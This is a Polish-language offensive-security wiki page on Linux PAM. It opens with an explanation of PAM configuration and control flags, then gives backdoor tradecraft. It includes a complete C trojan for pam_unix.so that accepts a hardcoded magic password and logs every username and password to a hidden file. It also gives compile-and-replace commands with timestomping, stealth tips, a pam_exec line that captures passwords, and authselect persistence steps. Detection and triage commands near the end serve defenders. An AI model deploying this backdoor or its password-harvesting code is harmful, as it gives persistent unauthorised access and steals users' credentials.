# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Podstawowe informacje

**PAM (Pluggable Authentication Modules)** działa jako mechanizm bezpieczeństwa, który **weryfikuje tożsamość użytkowników próbujących uzyskać dostęp do usług komputerowych**, kontrolując ich dostęp na podstawie różnych kryteriów. Można go porównać do cyfrowego strażnika, który zapewnia, że tylko autoryzowani użytkownicy mogą korzystać z określonych usług, jednocześnie potencjalnie ograniczając ich użycie w celu zapobiegania przeciążeniu systemu.

#### Pliki konfiguracyjne

- **Systemy Solaris i systemy oparte na UNIX** zazwyczaj korzystają z centralnego pliku konfiguracyjnego znajdującego się w `/etc/pam.conf`.
- **Systemy Linux** preferują podejście oparte na katalogu, przechowując konfiguracje poszczególnych usług w `/etc/pam.d`. Na przykład plik konfiguracyjny usługi login znajduje się w `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Przykładowa konfiguracja PAM dla usługi login może wyglądać następująco:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Obszary zarządzania PAM**

Te obszary lub grupy zarządzania obejmują **auth**, **account**, **password** i **session**, z których każdy odpowiada za inny aspekt procesu uwierzytelniania i zarządzania sesją:<sup>[[1]](#references)</sup>

- **Auth**: Weryfikuje tożsamość użytkownika, często prosząc o hasło.
- **Account**: Obsługuje weryfikację konta, sprawdzając warunki takie jak członkostwo w grupie lub ograniczenia zależne od pory dnia.
- **Password**: Zarządza aktualizacjami haseł, w tym sprawdzaniem złożoności i zapobieganiem atakom słownikowym.
- **Session**: Zarządza działaniami podczas rozpoczynania lub kończenia sesji usługi, takimi jak montowanie katalogów lub ustawianie limitów zasobów.

#### **Kontrole modułów PAM**

Kontrole określają reakcję modułu na powodzenie lub niepowodzenie, wpływając na cały proces uwierzytelniania. Obejmują one:<sup>[[1]](#references)</sup>

- **Required**: Niepowodzenie wymaganego modułu prowadzi ostatecznie do niepowodzenia, ale dopiero po sprawdzeniu wszystkich kolejnych modułów.
- **Requisite**: Natychmiastowe zakończenie procesu po niepowodzeniu.
- **Sufficient**: Powodzenie pomija pozostałe kontrole tego samego obszaru, chyba że kolejny moduł zakończy się niepowodzeniem.
- **Optional**: Powoduje niepowodzenie tylko wtedy, gdy jest jedynym modułem w stosie.

#### Semantyka ofensywna, która ma znaczenie

Podczas tworzenia backdoora w PAM **lokalizacja wstawionej reguły** jest często ważniejsza niż sam payload:

- `include` i `substack` pobierają reguły z innych plików, dlatego edycja `sshd` może wpływać tylko na SSH, podczas gdy edycja `system-auth`, `common-auth` lub innego współdzielonego stosu może jednocześnie wpływać na wiele usług.
- PAM obsługuje również kontrole w nawiasach, takie jak `[success=1 default=ignore]`. Można je wykorzystać do **pomijania jednego lub większej liczby modułów** po pomyślnym przejściu niestandardowego sprawdzenia, zamiast jawnie zastępować `pam_unix.so`.
- `module-path` może być **bezwzględna** (`/usr/lib/security/pam_custom.so`) lub **względna** względem domyślnego katalogu modułów PAM. We współczesnych systemach Linux rzeczywiste katalogi to często `/lib/security`, `/lib64/security`, `/usr/lib/security` lub ścieżki multiarch, takie jak `/usr/lib/x86_64-linux-gnu/security`.

Najważniejszy wniosek dla operatora: przed wprowadzeniem zmian zawsze odwzoruj **pełny graf usług**. Na przykład `sshd -> password-auth -> system-auth` w niektórych dystrybucjach lub `sshd -> system-remote-login -> system-login -> system-auth` w innych oznacza, że ten sam jednolinijkowy implant może objąć znacznie szerszy zakres, niż zamierzano.

#### Przykładowy scenariusz

W konfiguracji z wieloma modułami auth proces przebiega w ścisłej kolejności. Jeśli moduł `pam_securetty` stwierdzi, że terminal logowania jest nieautoryzowany, logowania roota zostają zablokowane, jednak wszystkie moduły nadal są przetwarzane ze względu na status "required". Moduł `pam_env` ustawia zmienne środowiskowe, potencjalnie poprawiając komfort użytkownika. Moduły `pam_ldap` i `pam_unix` współpracują przy uwierzytelnianiu użytkownika, przy czym `pam_unix` próbuje użyć wcześniej podanego hasła, zwiększając wydajność i elastyczność metod uwierzytelniania.


## Backdooring PAM – Hooking `pam_unix.so`

Klasyczną metodą persistence w środowiskach Linux o wysokiej wartości jest **zastąpienie legalnej biblioteki PAM trojanizowanym drop-inem**. Ponieważ każde logowanie przez SSH lub konsolę kończy się wywołaniem `pam_unix.so:pam_sm_authenticate()`, kilka wierszy kodu C wystarczy do przechwytywania danych uwierzytelniających lub zaimplementowania obejścia uwierzytelniania za pomocą *magicznego* hasła.<sup>[[2]](#references)</sup>

### Ściągawka kompilacji
<details>
<summary>Przykładowy trojan `pam_unix.so`</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Skompiluj i potajemnie podmień:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Wskazówki OpSec
1. **Atomowe nadpisanie** – zapisz dane do pliku tymczasowego, a następnie użyj `mv`, aby umieścić go we właściwym miejscu i uniknąć częściowo zapisanych bibliotek, które mogłyby zablokować SSH.
2. Umieszczenie pliku logów, na przykład `/usr/bin/.dbus.log`, pozwala mu wtapiać się w legalne artefakty środowiska desktopowego.
3. Zachowaj identyczne eksporty symboli (`pam_sm_setcred` itd.), aby uniknąć nieprawidłowego działania PAM.

### Wykrywanie
* Porównaj sumę MD5/SHA256 `pam_unix.so` z pakietem dystrybucji.
* `rpm -V pam` lub `debsums -s libpam-modules` pozwala wykryć podmienione biblioteki bez ręcznego obliczania sum.
* Sprawdź, czy w `/lib/security/` nie występują pliki zapisywalne przez wszystkich użytkowników lub nietypowe ustawienia właściciela.
* Reguła `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Przeszukaj konfiguracje PAM pod kątem nieoczekiwanych modułów: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Szybkie polecenia triage (po przejęciu lub podczas threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Wykorzystanie `pam_exec` do persistence
Zamiast zastępować `pam_unix.so`, mniej inwazyjnym podejściem jest dodanie linii `pam_exec` w `/etc/pam.d/sshd`, aby każde logowanie przez SSH uruchamiało implant, pozostawiając normalny stack bez zmian:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` otrzymuje metadane PAM w zmiennych środowiskowych, takich jak `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` i `PAM_TYPE`. Z opcją `expose_authtok` helper może również odczytywać hasło ze `stdin` podczas faz `auth` lub `password`. Jeśli chcesz, aby helper działał z effective UID zamiast real UID, dodaj `seteuid`.

Praktyczne uwagi:

- `session optional pam_exec.so ...` lepiej sprawdza się w przypadku **post-login actions**, takich jak ponowne otwieranie socketów lub uruchamianie odłączonego daemona.
- `auth optional pam_exec.so quiet expose_authtok ...` to typowy wybór dla **credential capture**, ponieważ wykonuje się przed otwarciem sesji.
- `type=session` lub `type=auth` można użyć do ograniczenia wykonywania do określonej fazy PAM i uniknięcia głośnego podwójnego wykonania.

### Przetrwanie działania narzędzi distro: `authselect`

W RHEL, CentOS Stream, Fedora i systemach pochodnych bezpośrednie edycje generowanych plików, takich jak `/etc/pam.d/system-auth` lub `/etc/pam.d/password-auth`, mogą zostać **nadpisane przez `authselect`**. Aby zapewnić persistence, operatorzy często modyfikują aktywny custom profile w `/etc/authselect/custom/<profile>/`, a następnie ponownie go wybierają lub stosują.

Typowy workflow, gdy masz root:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Ma to znaczenie zarówno dla działań ofensywnych, jak i triage: jeśli `/etc/pam.d/system-auth` zawiera banner `Generated by authselect` oraz `Do not modify this file manually`, rzeczywisty punkt persistence może znajdować się w `/etc/authselect/custom/`, a nie w `/etc/pam.d/`.

### Recent tradecraft seen in the wild

Najnowsze raporty z 2025 roku dotyczące linuxowego backdoora **Plague** pokazały dalszy rozwój tej samej podstawowej idei: malicious PAM component ze **static bypass password**, a także czyszczenie zmiennych środowiskowych związanych z SSH i historii powłoki (`HISTFILE=/dev/null)` w celu ograniczenia śladów sesji po zalogowaniu.<sup>[[3]](#references)</sup> To użyteczny hunting pattern, ponieważ logika backdoora może znajdować się w PAM, podczas gdy artefakty stealth pojawiają się dopiero **after** pomyślnym uwierzytelnieniu.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [The Covert Operator's Playbook: Infiltration of Global Telecom Networks - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
